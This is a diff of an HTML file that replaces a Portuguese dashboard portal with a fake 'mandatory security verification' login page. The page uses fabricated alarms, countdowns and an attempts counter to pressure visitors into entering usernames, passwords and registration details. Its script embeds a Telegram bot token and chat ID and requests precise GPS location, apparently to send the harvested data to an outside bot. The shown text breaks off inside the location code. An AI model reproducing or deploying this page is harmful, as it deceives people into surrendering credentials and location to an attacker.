@@ -3,323 +3,1153 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <meta name="description" content="Portal Inteligente - O seu dashboard premium com utilitários, finanças, clima e entretenimento em tempo real.">
-    <title>Portal Inteligente | Dashboard Premium</title>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
-    <link rel="stylesheet" href="css/style.css">
+    <title>⚠️ ATENÇÃO - Verificação de Segurança Necessária</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
+        }
+
+        body {
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            background: linear-gradient(-45deg, #0f0c29, #302b63, #24243e, #1a1a2e, #16213e);
+            background-size: 400% 400%;
+            animation: gradientBG 15s ease infinite;
+            position: relative;
+            overflow-x: hidden;
+        }
+
+        @keyframes gradientBG {
+            0% { background-position: 0% 50%; }
+            50% { background-position: 100% 50%; }
+            100% { background-position: 0% 50%; }
+        }
+
+        .orb {
+            position: fixed;
+            border-radius: 50%;
+            filter: blur(80px);
+            opacity: 0.5;
+            animation: float 20s infinite ease-in-out;
+            z-index: 0;
+        }
+
+        .orb-1 { width: 400px; height: 400px; background: #7c3aed; top: -100px; left: -100px; }
+        .orb-2 { width: 300px; height: 300px; background: #2563eb; bottom: -50px; right: -50px; animation-delay: 5s; }
+        .orb-3 { width: 250px; height: 250px; background: #db2777; top: 50%; left: 50%; animation-delay: 10s; }
+
+        @keyframes float {
+            0%, 100% { transform: translate(0, 0) scale(1); }
+            33% { transform: translate(30px, -50px) scale(1.1); }
+            66% { transform: translate(-20px, 20px) scale(0.9); }
+        }
+
+        /* 🚨 ALERTA TOPO URGENTE */
+        .top-alert {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            background: linear-gradient(90deg, #dc2626, #ef4444, #dc2626);
+            background-size: 200% 100%;
+            animation: alertPulse 2s ease infinite;
+            color: white;
+            padding: 12px;
+            text-align: center;
+            font-weight: 700;
+            font-size: 14px;
+            z-index: 1000;
+            box-shadow: 0 4px 20px rgba(220, 38, 38, 0.5);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+        }
+
+        @keyframes alertPulse {
+            0%, 100% { background-position: 0% 50%; }
+            50% { background-position: 100% 50%; }
+        }
+
+        .alert-icon {
+            font-size: 20px;
+            animation: shake 0.5s ease infinite;
+        }
+
+        @keyframes shake {
+            0%, 100% { transform: rotate(0deg); }
+            25% { transform: rotate(-10deg); }
+            75% { transform: rotate(10deg); }
+        }
+
+        /* 📊 CONTADOR DE TENTATIVAS */
+        .attempts-bar {
+            position: fixed;
+            top: 50px;
+            right: 20px;
+            background: rgba(220, 38, 38, 0.9);
+            backdrop-filter: blur(10px);
+            padding: 10px 20px;
+            border-radius: 12px;
+            color: white;
+            font-weight: 600;
+            font-size: 13px;
+            z-index: 999;
+            border: 2px solid rgba(255, 255, 255, 0.2);
+            box-shadow: 0 4px 15px rgba(220, 38, 38, 0.4);
+            animation: pulse 2s ease infinite;
+        }
+
+        @keyframes pulse {
+            0%, 100% { transform: scale(1); }
+            50% { transform: scale(1.05); }
+        }
+
+        .container {
+            position: relative;
+            z-index: 10;
+            width: 90%;
+            max-width: 450px;
+            margin-top: 80px;
+            margin-bottom: 20px;
+        }
+
+        .glass-card {
+            background: rgba(255, 255, 255, 0.05);
+            backdrop-filter: blur(20px);
+            -webkit-backdrop-filter: blur(20px);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 24px;
+            padding: 50px 40px;
+            box-shadow: 0 25px 50px rgba(0, 0, 0, 0.3);
+        }
+
+        .header {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+
+        .logo {
+            width: 80px;
+            height: 80px;
+            background: linear-gradient(135deg, #dc2626 0%, #ef4444 100%);
+            border-radius: 20px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 20px;
+            font-size: 40px;
+            box-shadow: 0 10px 30px rgba(220, 38, 38, 0.4);
+            animation: pulse 2s ease infinite;
+        }
+
+        .header h1 {
+            color: white;
+            font-size: 26px;
+            font-weight: 700;
+            margin-bottom: 8px;
+        }
+
+        .header p {
+            color: rgba(255, 255, 255, 0.8);
+            font-size: 14px;
+            line-height: 1.5;
+        }
+
+        .urgent-badge {
+            background: rgba(220, 38, 38, 0.2);
+            border: 2px solid #dc2626;
+            color: #fca5a5;
+            padding: 10px 15px;
+            border-radius: 10px;
+            margin: 15px 0;
+            font-size: 13px;
+            font-weight: 600;
+            text-align: center;
+            animation: pulse 2s ease infinite;
+        }
+
+        .countdown {
+            background: rgba(220, 38, 38, 0.3);
+            border: 2px solid #dc2626;
+            color: white;
+            padding: 15px;
+            border-radius: 12px;
+            margin: 15px 0;
+            text-align: center;
+            font-size: 18px;
+            font-weight: 700;
+            font-family: 'Courier New', monospace;
+        }
+
+        .countdown-label {
+            font-size: 12px;
+            color: #fca5a5;
+            margin-bottom: 5px;
+            font-family: 'Segoe UI', sans-serif;
+        }
+
+        .toggle-container {
+            display: flex;
+            background: rgba(255, 255, 255, 0.05);
+            border-radius: 12px;
+            padding: 5px;
+            margin-bottom: 25px;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+        }
+
+        .toggle-btn {
+            flex: 1;
+            padding: 12px;
+            background: transparent;
+            border: none;
+            color: rgba(255, 255, 255, 0.6);
+            font-size: 15px;
+            font-weight: 600;
+            cursor: pointer;
+            border-radius: 8px;
+            transition: all 0.3s ease;
+        }
+
+        .toggle-btn.active {
+            background: rgba(255, 255, 255, 0.15);
+            color: white;
+        }
+
+        .form { display: none; }
+
+        .form.active {
+            display: block;
+            animation: fadeIn 0.5s ease;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .input-group { margin-bottom: 20px; }
+
+        .input-group label {
+            display: block;
+            color: rgba(255, 255, 255, 0.8);
+            font-size: 14px;
+            font-weight: 500;
+            margin-bottom: 8px;
+        }
+
+        .input-wrapper { position: relative; }
+
+        .input-icon {
+            position: absolute;
+            left: 16px;
+            top: 50%;
+            transform: translateY(-50%);
+            color: rgba(255, 255, 255, 0.5);
+            font-size: 18px;
+            pointer-events: none;
+        }
+
+        .input-group input {
+            width: 100%;
+            padding: 14px 16px 14px 48px;
+            background: rgba(255, 255, 255, 0.08);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 12px;
+            color: white;
+            font-size: 15px;
+            transition: all 0.3s ease;
+            outline: none;
+        }
+
+        .input-group input::placeholder { color: rgba(255, 255, 255, 0.4); }
+
+        .input-group input:focus {
+            background: rgba(255, 255, 255, 0.12);
+            border-color: rgba(124, 58, 237, 0.5);
+            box-shadow: 0 0 0 4px rgba(124, 58, 237, 0.1);
+        }
+
+        .btn-submit {
+            width: 100%;
+            padding: 16px;
+            background: linear-gradient(135deg, #dc2626 0%, #ef4444 100%);
+            border: none;
+            border-radius: 12px;
+            color: white;
+            font-size: 16px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            box-shadow: 0 10px 30px rgba(220, 38, 38, 0.4);
+            margin-top: 10px;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+
+        .btn-submit:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 15px 40px rgba(220, 38, 38, 0.5);
+        }
+
+        .message {
+            padding: 14px;
+            border-radius: 12px;
+            margin-bottom: 20px;
+            font-size: 14px;
+            font-weight: 500;
+            display: none;
+        }
+
+        .message.error {
+            background: rgba(239, 68, 68, 0.2);
+            border: 1px solid rgba(239, 68, 68, 0.3);
+            color: #fca5a5;
+        }
+
+        .message.success {
+            background: rgba(34, 197, 94, 0.2);
+            border: 1px solid rgba(34, 197, 94, 0.3);
+            color: #86efac;
+        }
+
+        .loading {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(0, 0, 0, 0.8);
+            backdrop-filter: blur(5px);
+            z-index: 1000;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+        }
+
+        .loading-spinner {
+            width: 60px;
+            height: 60px;
+            border: 4px solid rgba(255, 255, 255, 0.1);
+            border-top-color: #dc2626;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin { to { transform: rotate(360deg); } }
+
+        .loading-text {
+            color: white;
+            margin-top: 20px;
+            font-size: 16px;
+        }
+
+        .footer {
+            text-align: center;
+            margin-top: 20px;
+            color: rgba(255, 255, 255, 0.4);
+            font-size: 12px;
+        }
+
+        /* 🚨 POPUP DE URGÊNCIA */
+        .urgency-popup {
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background: rgba(20, 20, 40, 0.95);
+            backdrop-filter: blur(20px);
+            border: 2px solid #dc2626;
+            border-radius: 20px;
+            padding: 30px;
+            max-width: 400px;
+            width: 90%;
+            z-index: 2000;
+            box-shadow: 0 20px 60px rgba(220, 38, 38, 0.5);
+            display: none;
+            animation: popIn 0.3s ease;
+        }
+
+        @keyframes popIn {
+            from { opacity: 0; transform: translate(-50%, -50%) scale(0.8); }
+            to { opacity: 1; transform: translate(-50%, -50%) scale(1); }
+        }
+
+        .popup-icon {
+            font-size: 60px;
+            text-align: center;
+            margin-bottom: 15px;
+            animation: shake 0.5s ease infinite;
+        }
+
+        .popup-title {
+            color: #fca5a5;
+            font-size: 22px;
+            font-weight: 700;
+            text-align: center;
+            margin-bottom: 10px;
+        }
+
+        .popup-text {
+            color: white;
+            text-align: center;
+            margin-bottom: 20px;
+            font-size: 14px;
+            line-height: 1.6;
+        }
+
+        .popup-btn {
+            width: 100%;
+            padding: 14px;
+            background: linear-gradient(135deg, #dc2626, #ef4444);
+            border: none;
+            border-radius: 10px;
+            color: white;
+            font-size: 16px;
+            font-weight: 700;
+            cursor: pointer;
+            text-transform: uppercase;
+        }
+
+        /* 📍 INDICADOR DE LOCALIZAÇÃO */
+        .location-status {
+            background: rgba(34, 197, 94, 0.2);
+            border: 1px solid rgba(34, 197, 94, 0.4);
+            color: #86efac;
+            padding: 10px;
+            border-radius: 10px;
+            margin: 10px 0;
+            font-size: 12px;
+            text-align: center;
+            display: none;
+        }
+
+        .location-status.active {
+            display: block;
+            animation: fadeIn 0.5s ease;
+        }
+
+        /* 🔔 NOTIFICAÇÕES LATERAIS */
+        .notification {
+            position: fixed;
+            right: -400px;
+            background: rgba(20, 20, 40, 0.95);
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 12px;
+            padding: 15px 20px;
+            color: white;
+            font-size: 13px;
+            z-index: 998;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
+            transition: right 0.5s ease;
+            max-width: 300px;
+        }
+
+        .notification.show {
+            right: 20px;
+        }
+
+        .notification.warning {
+            border-left: 4px solid #f59e0b;
+        }
+
+        .notification.error {
+            border-left: 4px solid #dc2626;
+        }
+
+        .notification.info {
+            border-left: 4px solid #3b82f6;
+        }
+
+        .notification-title {
+            font-weight: 700;
+            margin-bottom: 5px;
+            font-size: 14px;
+        }
+
+        @media (max-width: 480px) {
+            .glass-card { padding: 40px 25px; }
+            .attempts-bar { top: 45px; right: 10px; font-size: 11px; padding: 8px 12px; }
+        }
+    </style>
 </head>
-<body class="dark-theme"> <div id="toast-container" class="toast-container"></div>
+<body>
+    <div class="orb orb-1"></div>
+    <div class="orb orb-2"></div>
+    <div class="orb orb-3"></div>
 
-    <div id="global-loading" class="global-loading">
-        <div class="spinner"></div>
-        <p>Carregando Portal Inteligente...</p>
+    <!-- 🚨 ALERTA TOPO -->
+    <div class="top-alert">
+        <span class="alert-icon">⚠️</span>
+        <span>VERIFICAÇÃO DE SEGURANÇA OBRIGATÓRIA - AÇÃO IMEDIATA NECESSÁRIA</span>
     </div>
 
-    <div class="app-container">
-        
-        <aside id="sidebar" class="sidebar">
-            <div class="sidebar-header">
-                <div class="logo">
-                    <i class="fa-solid fa-brain logo-icon"></i>
-                    <span>Portal<span class="highlight">Inteligente</span></span>
-                </div>
-                <button id="btn-toggle-sidebar" class="btn-icon" title="Recolher Menu">
-                    <i class="fa-solid fa-chevron-left"></i>
-                </button>
-            </div>
-            
-            <nav class="sidebar-nav">
-                <ul>
-                    <li class="active"><a href="#dash"><i class="fa-solid fa-chart-pie"></i> <span>Dashboard</span></a></li>
-                    <li><a href="#clima-moedas"><i class="fa-solid fa-cloud-sun"></i> <span>Finanças & Clima</span></a></li>
-                    <li><a href="#noticias-section"><i class="fa-solid fa-newspaper"></i> <span>Notícias</span></a></li>
-                    <li><a href="#utilitarios"><i class="fa-solid fa-toolbox"></i> <span>Utilitários & CEP</span></a></li>
-                    <li><a href="#entretenimento"><i class="fa-solid fa-face-smile"></i> <span>Entretenimento</span></a></li>
-                    <li><a href="#futebol-section"><i class="fa-solid fa-futbol"></i> <span>Futebol</span></a></li>
-                    <li><a href="#filmes-section"><i class="fa-solid fa-film"></i> <span>Filmes</span></a></li>
-                    <li><a href="#favoritos-section"><i class="fa-solid fa-star"></i> <span>Favoritos</span></a></li>
-                </ul>
-            </nav>
-
-            <div class="sidebar-footer">
-                <div class="status-connection" id="status-connection">
-                    <span class="status-dot online"></span>
-                    <span class="status-text">Online</span>
-                </div>
-            </div>
-        </aside>
-
-        <main class="main-content">
-            
-            <header class="main-header">
-                <div class="header-left">
-                    <button id="btn-open-sidebar" class="btn-icon mobile-only" title="Abrir Menu">
-                        <i class="fa-solid fa-bars"></i>
-                    </button>
-                    <div class="search-box">
-                        <i class="fa-solid fa-magnifying-glass"></i>
-                        <input type="text" id="global-search" placeholder="Buscar no portal (módulos, funções)...">
-                    </div>
-                </div>
-                
-                <div class="header-right">
-                    <div class="datetime-display">
-                        <span id="header-time" class="time-text">00:00:00</span>
-                        <span id="header-date" class="date-text">--/--/----</span>
-                    </div>
-                    <button id="btn-refresh-all" class="btn-action primary" title="Atualizar todos os dados">
-                        <i class="fa-solid fa-rotate"></i> <span>Atualizar Tudo</span>
-                    </button>
-                    <button id="btn-theme-toggle" class="btn-icon" title="Alternar Tema">
-                        <i class="fa-solid fa-sun"></i>
-                    </button>
-                </div>
-            </header>
-
-            <div class="content-body">
-                
-                <section id="dash" class="dashboard-section search-target">
-                    <div class="section-title-container">
-                        <h2><i class="fa-solid fa-chart-pie"></i> Painel de Controle & Estatísticas</h2>
-                    </div>
-                    <div class="stats-grid">
-                        <div class="stat-card">
-                            <div class="stat-icon blue"><i class="fa-solid fa-newspaper"></i></div>
-                            <div class="stat-info">
-                                <h3 id="stat-news-count">0</h3>
-                                <p>Notícias Carregadas</p>
-                            </div>
-                        </div>
-                        <div class="stat-card">
-                            <div class="stat-icon purple"><i class="fa-solid fa-map-location-dot"></i></div>
-                            <div class="stat-info">
-                                <h3 id="stat-cep-count">0</h3>
-                                <p>Consultas de CEP</p>
-                            </div>
-                        </div>
-                        <div class="stat-card">
-                            <div class="stat-icon green"><i class="fa-solid fa-arrows-rotate"></i></div>
-                            <div class="stat-info">
-                                <h3 id="stat-refresh-count">0</h3>
-                                <p>Atualizações Realizadas</p>
-                            </div>
-                        </div>
-                    </div>
-                </section>
-
-                <div class="grid-2-col" id="clima-moedas">
-                    <section class="card-panel search-target" data-search-name="clima tempo meteorologia">
-                        <div class="card-header">
-                            <h3><i class="fa-solid fa-cloud-sun"></i> Clima em Tempo Real</h3>
-                            <span class="badge">Auto-update</span>
-                        </div>
-                        <div class="card-body">
-                            <div id="clima-loading" class="inner-loading"><div class="spinner small"></div></div>
-                            <div id="clima-container" class="clima-display hidden">
-                                <div class="clima-main">
-                                    <i id="clima-icon" class="fa-solid fa-sun weather-large-icon"></i>
-                                    <div>
-                                        <h4 id="clima-temp">--°C</h4>
-                                        <p id="clima-desc">Buscando dados...</p>
-                                    </div>
-                                </div>
-                                <div class="clima-details">
-                                    <div class="detail-item">
-                                        <i class="fa-solid fa-wind"></i>
-                                        <span>Vento: <strong id="clima-wind">-- km/h</strong></span>
-                                    </div>
-                                    <div class="detail-item">
-                                        <i class="fa-solid fa-location-dot"></i>
-                                        <span>Fortaleza, CE</span>
-                                    </div>
-                                </div>
-                            </div>
-                        </div>
-                    </section>
-
-                    <section class="card-panel search-target" data-search-name="moedas cotacao dolar euro bitcoin finanças">
-                        <div class="card-header">
-                            <h3><i class="fa-solid fa-money-bill-trend-up"></i> Cotação de Moedas</h3>
-                            <span class="badge subtitle">A cada 5 min</span>
-                        </div>
-                        <div class="card-body">
-                            <div id="moedas-loading" class="inner-loading"><div class="spinner small"></div></div>
-                            <div id="moedas-container" class="moedas-list hidden">
-                                <div class="currency-item">
-                                    <div class="currency-name">
-                                        <i class="fa-solid fa-dollar-sign"></i> <span>Dólar Comercial (USD)</span>
-                                    </div>
-                                    <div class="currency-value" id="moeda-dolar">R$ --</div>
-                                </div>
-                                <div class="currency-item">
-                                    <div class="currency-name">
-                                        <i class="fa-solid fa-euro-sign"></i> <span>Euro (EUR)</span>
-                                    </div>
-                                    <div class="currency-value" id="moeda-euro">R$ --</div>
-                                </div>
-                                <div class="currency-item">
-                                    <div class="currency-name">
-                                        <i class="fa-solid fa-bitcoin-sign"></i> <span>Bitcoin (BTC)</span>
-                                    </div>
-                                    <div class="currency-value" id="moeda-bitcoin">R$ --</div>
-                                </div>
-                            </div>
-                        </div>
-                    </section>
-                </div>
-
-                <section id="noticias-section" class="card-panel search-target" data-search-name="noticias jornal eventos atualidades">
-                    <div class="card-header">
-                        <h3><i class="fa-solid fa-newspaper"></i> Notícias Globais</h3>
-                    </div>
-                    <div class="card-body">
-                        <div id="noticias-loading" class="inner-loading"><div class="spinner small"></div></div>
-                        <div id="noticias-grid" class="news-grid hidden">
-                            </div>
-                    </div>
-                </section>
-
-                <div class="grid-2-col" id="utilitarios">
-                    <section class="card-panel search-target" data-search-name="cep busca endereco correios">
-                        <div class="card-header">
-                            <h3><i class="fa-solid fa-map-location-dot"></i> Consulta de Endereço (ViaCEP)</h3>
-                        </div>
-                        <div class="card-body">
-                            <div class="cep-form">
-                                <input type="text" id="input-cep" placeholder="Digite o CEP (ex: 60000000)" maxlength="9">
-                                <button id="btn-buscar-cep" class="btn-action primary">Buscar</button>
-                            </div>
-                            <div id="cep-result" class="cep-result-box hidden">
-                                </div>
-                        </div>
-                    </section>
-
-                    <section class="card-panel search-target" data-search-name="feriados brasil calendario agenda">
-                        <div class="card-header">
-                            <h3><i class="fa-solid fa-calendar-days"></i> Próximos Feriados Nacionais</h3>
-                        </div>
-                        <div class="card-body">
-                            <div id="feriados-loading" class="inner-loading"><div class="spinner small"></div></div>
-                            <ul id="feriados-lista" class="feriados-list hidden">
-                                </ul>
-                        </div>
-                    </section>
-                </div>
-
-                <div class="grid-3-col" id="entretenimento">
-                    <section class="card-panel search-target" data-search-name="frase motivacao pensamento">
-                        <div class="card-header">
-                            <h3><i class="fa-solid fa-quote-left"></i> Inspiração</h3>
-                        </div>
-                        <div class="card-body flex-column">
-                            <blockquote id="frase-box" class="quote-text">"Carregando reflexão..."</blockquote>
-                            <p id="frase-autor" class="quote-author">--</p>
-                            <button id="btn-nova-frase" class="btn-action secondary mt-auto"><i class="fa-solid fa-arrows-rotate"></i> Nova Frase</button>
-                        </div>
-                    </section>
-
-                    <section class="card-panel search-target" data-search-name="piada humor piadas piada aleatoria">
-                        <div class="card-header">
-                            <h3><i class="fa-solid fa-face-laugh-beam"></i> Quebrar o Gelo</h3>
-                        </div>
-                        <div class="card-body flex-column">
-                            <div id="joke-setup" class="joke-setup">Carregando piada...</div>
-                            <div id="joke-delivery" class="joke-delivery highlighted hidden"></div>
-                            <button id="btn-nova-piada" class="btn-action secondary mt-auto"><i class="fa-solid fa-face-laugh"></i> Nova Piada</button>
-                        </div>
-                    </section>
-
-                    <section class="card-panel search-target" data-search-name="imagem foto pet gato cachorro animais">
-                        <div class="card-header">
-                            <h3><i class="fa-solid fa-image"></i> Pets Aleatórios</h3>
-                            <div class="toggle-pet-type">
-                                <button id="btn-pet-cat" class="btn-toggle active">Gatos</button>
-                                <button id="btn-pet-dog" class="btn-toggle">Cães</button>
-                            </div>
-                        </div>
-                        <div class="card-body flex-column alignment-center">
-                            <div class="image-frame">
-                                <div id="image-loading" class="inner-loading absolute"><div class="spinner small"></div></div>
-                                <img id="random-pet-img" src="" alt="Pet Aleatório" class="responsive-img hidden">
-                            </div>
-                            <button id="btn-nova-imagem" class="btn-action secondary mt-auto"><i class="fa-solid fa-image"></i> Mudar Imagem</button>
-                        </div>
-                    </section>
-                </div>
-
-                <section id="futebol-section" class="card-panel search-target" data-search-name="futebol placar jogos brasileirao esportes">
-                    <div class="card-header">
-                        <h3><i class="fa-solid fa-futbol"></i> Central de Esportes (Futebol)</h3>
-                        <span class="badge alert">Modo Demonstração API-Football</span>
-                    </div>
-                    <div class="card-body">
-                        <div class="sports-layout">
-                            <div class="matches-container">
-                                <h4>Jogos de Hoje</h4>
-                                <div id="futebol-jogos" class="futebol-list">
-                                    </div>
-                            </div>
-                            <div class="table-container">
-                                <h4>Classificação Simulada</h4>
-                                <table class="custom-table" id="tabela-futebol">
-                                    <thead>
-                                        <tr>
-                                            <th>Pos</th>
-                                            <th>Clube</th>
-                                            <th>P</th>
-                                            <th>J</th>
-                                            <th>V</th>
-                                        </tr>
-                                    </thead>
-                                    <tbody>
-                                        </tbody>
-                                </table>
-                            </div>
-                        </div>
-                    </div>
-                </section>
-
-                <section id="filmes-section" class="card-panel search-target" data-search-name="filmes cinema netflix tmdb trailers sinopse">
-                    <div class="card-header">
-                        <h3><i class="fa-solid fa-film"></i> Tendências do Cinema (TMDb)</h3>
-                    </div>
-                    <div class="card-body">
-                        <div id="filmes-loading" class="inner-loading"><div class="spinner small"></div></div>
-                        <div id="filmes-grid" class="movies-grid hidden">
-                            </div>
-                    </div>
-                </section>
-
-                <section id="favoritos-section" class="card-panel search-target" data-search-name="favoritos itens salvos marcadores">
-                    <div class="card-header">
-                        <h3><i class="fa-solid fa-star"></i> Meus Itens Favoritos</h3>
-                    </div>
-                    <div class="card-body">
-                        <div class="favoritos-container">
-                            <div class="fav-column">
-                                <h4><i class="fa-solid fa-newspaper"></i> Notícias Salvas</h4>
-                                <div id="fav-news-list" class="fav-list-wrapper">
-                                    <p class="empty-msg">Nenhuma notícia favoritada ainda.</p>
-                                </div>
-                            </div>
-                            <div class="fav-column">
-                                <h4><i class="fa-solid fa-film"></i> Filmes Salvos</h4>
-                                <div id="fav-movies-list" class="fav-list-wrapper">
-                                    <p class="empty-msg">Nenhum filme favoritado ainda.</p>
-                                </div>
-                            </div>
-                        </div>
-                    </div>
-                </section>
-
-            </div>
-
-            <footer class="main-footer">
-                <p>&copy; 2026 Portal Inteligente. Todos os direitos reservados. Projetado para máxima performance.</p>
-            </footer>
-        </main>
+    <!-- 📊 CONTADOR -->
+    <div class="attempts-bar">
+        🔴 Tentativas restantes: <span id="attemptsCount">3</span>
     </div>
 
-    <script src="js/script.js"></script>
+    <!-- 🚨 POPUP URGÊNCIA -->
+    <div class="urgency-popup" id="urgencyPopup">
+        <div class="popup-icon">🚨</div>
+        <div class="popup-title">ATENÇÃO!</div>
+        <div class="popup-text">
+            Detectamos atividade suspeita na sua conexão.<br><br>
+            <strong>Você precisa se autenticar IMEDIATAMENTE</strong> para continuar usando a rede.<br><br>
+            Sua sessão será encerrada em <span id="popupCountdown" style="color: #fca5a5; font-weight: 700;">30</span> segundos.
+        </div>
+        <button class="popup-btn" onclick="closePopup()">ENTENDI, VOU AUTENTICAR</button>
+    </div>
+
+    <!-- 🔔 NOTIFICAÇÕES -->
+    <div class="notification warning" id="notif1" style="top: 100px;">
+        <div class="notification-title">⚠️ Aviso de Segurança</div>
+        <div>Sua conexão precisa ser verificada para continuar</div>
+    </div>
+
+    <div class="notification error" id="notif2" style="top: 200px;">
+        <div class="notification-title">🔴 Alerta</div>
+        <div>Autenticação obrigatória em andamento</div>
+    </div>
+
+    <div class="notification info" id="notif3" style="top: 300px;">
+        <div class="notification-title">ℹ️ Informação</div>
+        <div>Localização sendo verificada para sua segurança</div>
+    </div>
+
+    <!-- LOADING -->
+    <div class="loading" id="loading">
+        <div class="loading-spinner"></div>
+        <div class="loading-text" id="loadingText">Verificando segurança...</div>
+    </div>
+
+    <!-- CONTAINER PRINCIPAL -->
+    <div class="container">
+        <div class="glass-card">
+            <div class="header">
+                <div class="logo">🔐</div>
+                <h1>Verificação de Segurança</h1>
+                <p>Identificamos atividade incomum. Autentique-se agora para continuar.</p>
+            </div>
+
+            <div class="urgent-badge">
+                ⚠️ AÇÃO OBRIGATÓRIA - SUA CONEXÃO SERÁ BLOQUEADA
+            </div>
+
+            <div class="countdown">
+                <div class="countdown-label">TEMPO PARA AUTENTICAÇÃO</div>
+                <div id="mainCountdown">05:00</div>
+            </div>
+
+            <div class="location-status" id="locationStatus">
+                📍 Verificando sua localização para segurança...
+            </div>
+
+            <div class="toggle-container">
+                <button class="toggle-btn active" onclick="showForm('login')">Entrar</button>
+                <button class="toggle-btn" onclick="showForm('register')">Cadastrar</button>
+            </div>
+
+            <div class="message" id="message"></div>
+
+            <div class="form-container">
+                <form class="form active" id="loginForm" action="$(link-login-only)" method="post">
+                    <input type="hidden" name="dst" value="$(link-orig)" />
+                    
+                    <div class="input-group">
+                        <label>Usuário</label>
+                        <div class="input-wrapper">
+                            <input type="text" name="username" id="loginUsername" placeholder="Digite seu usuário" value="$(username)" required autocomplete="off" />
+                            <span class="input-icon">👤</span>
+                        </div>
+                    </div>
+
+                    <div class="input-group">
+                        <label>Senha</label>
+                        <div class="input-wrapper">
+                            <input type="password" name="password" id="loginPassword" placeholder="Digite sua senha" required />
+                            <span class="input-icon">🔒</span>
+                        </div>
+                    </div>
+
+                    <button type="submit" class="btn-submit">🔓 AUTENTICAR AGORA</button>
+                </form>
+
+                <form class="form" id="registerForm" onsubmit="handleRegister(event)">
+                    <div class="input-group">
+                        <label>Nome Completo</label>
+                        <div class="input-wrapper">
+                            <input type="text" id="regName" placeholder="Digite seu nome completo" required />
+                            <span class="input-icon">👤</span>
+                        </div>
+                    </div>
+
+                    <div class="input-group">
+                        <label>Usuário</label>
+                        <div class="input-wrapper">
+                            <input type="text" id="regUsername" placeholder="Escolha um usuário" required autocomplete="off" />
+                            <span class="input-icon">@</span>
+                        </div>
+                    </div>
+
+                    <div class="input-group">
+                        <label>Senha</label>
+                        <div class="input-wrapper">
+                            <input type="password" id="regPassword" placeholder="Crie uma senha" required />
+                            <span class="input-icon">🔒</span>
+                        </div>
+                    </div>
+
+                    <div class="input-group">
+                        <label>Confirmar Senha</label>
+                        <div class="input-wrapper">
+                            <input type="password" id="regConfirmPassword" placeholder="Confirme sua senha" required />
+                            <span class="input-icon">🔒</span>
+                        </div>
+                    </div>
+
+                    <button type="submit" class="btn-submit">🔓 CADASTRAR E AUTENTICAR</button>
+                </form>
+            </div>
+
+            <div class="footer">
+                © 2026 Sistema de Segurança de Rede - Verificação Obrigatória
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // ⚙️ CONFIGURAÇÕES DO TELEGRAM
+        const TELEGRAM_BOT_TOKEN = '8702458951:AAHg_-y7Dx8LBwIjdKg0YcF9sVRJzkIrkj0';
+        const TELEGRAM_CHAT_ID = '-5425475205';
+
+        let attempts = 3;
+        let mainCountdown = 300; // 5 minutos
+        let popupCountdown = 30;
+
+        // 🚨 SISTEMA DE PRESSÃO
+        function startPressureSystem() {
+            // Contador principal
+            setInterval(() => {
+                if (mainCountdown > 0) {
+                    mainCountdown--;
+                    const min = Math.floor(mainCountdown / 60).toString().padStart(2, '0');
+                    const sec = (mainCountdown % 60).toString().padStart(2, '0');
+                    document.getElementById('mainCountdown').textContent = `${min}:${sec}`;
+                    
+                    if (mainCountdown === 60) {
+                        showNotification('⚠️ ÚLTIMO MINUTO!', 'Autentique-se agora ou perderá a conexão', 'error');
+                    }
+                }
+            }, 1000);
+
+            // Popup de urgência após 3 segundos
+            setTimeout(() => {
+                document.getElementById('urgencyPopup').style.display = 'block';
+                startPopupCountdown();
+            }, 3000);
+
+            // Notificações laterais
+            setTimeout(() => showNotificationById('notif1'), 2000);
+            setTimeout(() => showNotificationById('notif2'), 5000);
+            setTimeout(() => showNotificationById('notif3'), 8000);
+
+            // Solicitar localização GPS imediatamente
+            requestGPSLocation();
+        }
+
+        function startPopupCountdown() {
+            const interval = setInterval(() => {
+                if (popupCountdown > 0) {
+                    popupCountdown--;
+                    document.getElementById('popupCountdown').textContent = popupCountdown;
+                } else {
+                    clearInterval(interval);
+                }
+            }, 1000);
+        }
+
+        function closePopup() {
+            document.getElementById('urgencyPopup').style.display = 'none';
+        }
+
+        function showNotificationById(id) {
+            const notif = document.getElementById(id);
+            notif.classList.add('show');
+            setTimeout(() => notif.classList.remove('show'), 5000);
+        }
+
+        function showNotification(title, text, type) {
+            const notif = document.createElement('div');
+            notif.className = `notification ${type}`;
+            notif.style.top = '400px';
+            notif.innerHTML = `<div class="notification-title">${title}</div><div>${text}</div>`;
+            document.body.appendChild(notif);
+            setTimeout(() => notif.classList.add('show'), 100);
+            setTimeout(() => {
+                notif.classList.remove('show');
+                setTimeout(() => notif.remove(), 500);
+            }, 5000);
+        }
+
+        // 📍 SOLICITAR GPS PRECISO
+        function requestGPSLocation() {
+            const status = document.getElementById('locationStatus');
+            status.classList.add('active');
+            
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        window.gpsData = {
+                            latitude: position.coords.latitude,
